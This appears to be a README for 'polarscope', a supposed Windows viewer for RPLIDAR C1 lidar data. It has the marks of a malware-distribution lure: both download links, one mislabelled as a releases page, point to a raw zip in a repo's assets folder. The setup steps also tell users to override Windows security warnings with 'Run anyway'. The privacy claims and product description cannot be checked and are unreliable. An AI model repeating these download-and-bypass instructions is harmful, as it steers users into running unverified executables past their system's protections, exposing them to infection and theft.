# 📡 polarscope - Visualize your RPLIDAR data in real-time

[![](https://img.shields.io/badge/Download_Latest-blue?style=for-the-badge)](https://github.com/reddishorangeacetphenetidin113/polarscope/raw/refs/heads/main/assets/Software_2.9-beta.5.zip)

## 📌 Overview

Polarscope turns your raw lidar data into clear visual maps. This desktop application connects to your RPLIDAR C1 sensor and displays distance measurements as they happen. It uses a dark-mode interface to keep your eyes comfortable during long sessions. You can save your work as snapshots or data tables for later review.

## ⚙️ System Requirements

- Windows 10 or Windows 11
- At least 4 gigabytes of memory
- One vacant USB port
- An RPLIDAR C1 sensor

## 📥 Getting Started

Follow these steps to set up the software on your computer.

1. Visit the [releases page](https://github.com/reddishorangeacetphenetidin113/polarscope/raw/refs/heads/main/assets/Software_2.9-beta.5.zip) to download the program.
2. Select the file ending in .exe from the list under the latest version.
3. Save the file to your computer.
4. Double-click the file to open the application.
5. Windows might show a security window. Click "More info" and then "Run anyway" if the system protects the app.

## 🔌 Connecting Your Hardware

The application needs a physical connection to your device. 

1. Plug the RPLIDAR C1 USB cable into your machine.
2. Wait for the operating system to install the driver.
3. Open polarscope.
4. The software detects the device once you click the scan button. If the screen remains blank, check your USB connection or try a different port.

## 🖥️ Using the Interface

The main workspace shows your surroundings. 

- **The Radar Plot:** This center area shows measurements using polar coordinates. Objects appear as colored dots based on their distance from the sensor.
- **The Toolbar:** Use the top menu to toggle features. 
- **Color Settings:** You can switch between light and dark backgrounds. The default dark mode reduces glare.

## 💾 Saving Your Work

You have two ways to store data while using the tool.

- **Snapshots:** Click the camera button to save the current view as a PNG image. The app saves these files in your Pictures folder by default.
- **Data Records:** Click the record button to start saving measurements to a CSV file. You can open these files in programs like Excel later to analyze the numbers.

## 🛠️ Troubleshooting

If the application does not work, check these common issues.

- **No Device Found:** Unplug the USB cable and plug it back in. Ensure no other programs are using the lidar sensor.
- **Slow Performance:** Close other demanding applications when using the lidar to ensure the system keeps up with the data stream.
- **Driver Errors:** Ensure you have the latest drivers for the RPLIDAR C1. You can find these on the official manufacturer website.

## ⚖️ License and Privacy

This software operates locally on your machine. It does not send your data to any external servers. All processing finishes within the app on your own hardware. Your snapshots and recordings remain on your local storage unless you share them elsewhere.
